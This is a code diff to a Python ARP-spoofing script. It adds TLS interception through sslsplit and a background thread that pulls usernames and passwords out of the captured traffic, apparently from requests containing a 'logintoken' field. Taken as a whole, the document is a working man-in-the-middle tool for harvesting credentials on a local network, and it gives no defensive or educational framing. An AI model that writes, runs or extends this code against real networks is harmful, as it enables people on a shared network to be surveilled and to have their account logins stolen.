@@ -2,9 +2,11 @@
 
 import os
 import time
+import threading
 import netifaces as ni
 
 from math import log2
+from subprocess import Popen, DEVNULL
 from scapy.all import ARP, Ether, srp, send
 
 
@@ -40,23 +42,62 @@ def arp_spoofing(gateway, device):
         send(router, verbose=False)
 
 
+def sslsplit():
+    command = [
+        'sslsplit', '-D', '-S', 'sslsplit-log', '-p', 'sslsplit.pid',
+        '-k', 'ca.key', '-c', 'ca.crt', 'ssl', '0.0.0.0', '8443'
+    ]
+    Popen(command, stdout=DEVNULL, stderr=DEVNULL)
+
+
+def get_username_and_password():
+    try:
+        while True:
+            directory = 'sslsplit-log'
+            for filename in os.listdir(os.path.join('.', directory)):
+                if '.bak' in filename: continue
+                found = False
+                with open(os.path.join('.', directory, filename), 'r', errors='replace') as f:
+                    lines = f.readlines()
+                    for line in lines:
+                        if 'logintoken' in line:
+                            found = True
+                            username = line.split('&')[1].split('=')[1]
+                            password = line.split('&')[2].split('=')[1]
+                            print(f'Username: {username}\nPassword: {password}')
+                if found:
+                    pathname = os.path.join('.', directory, filename)
+                    os.rename(pathname, pathname + '.bak')
+            time.sleep(3)
+            if not os.path.exists('sslsplit.pid'): return
+    except KeyboardInterrupt:
+        return
+
+
 def main():
     if os.geteuid() != 0:
         exit(f'{__file__}: Permission denied')
 
-    packet_count = 0
-
     gateway, device = get_device_info()
     arp_spoofing(gateway, device)
+    sslsplit()
+
+    thread = threading.Thread(target=get_username_and_password)
+    thread.start()
 
     while True:
         try:
             arp_spoofing(gateway, device)
-            packet_count += 2
-            print(f'\r[+] Packets Sent: {packet_count}', end='')
+            time.sleep(5)
         except KeyboardInterrupt:
-            print(f'\n[-] Detected CTRL + C and Exiting ...')
+            if os.path.exists('sslsplit.pid'):
+                with open('sslsplit.pid') as f:
+                    pid = next(f).strip()
+                    command = ['kill', '-15', pid]
+                    Popen(command, stdout=DEVNULL, stderr=DEVNULL)
             break
+
+    thread.join()
 
 
 if __name__ == '__main__':
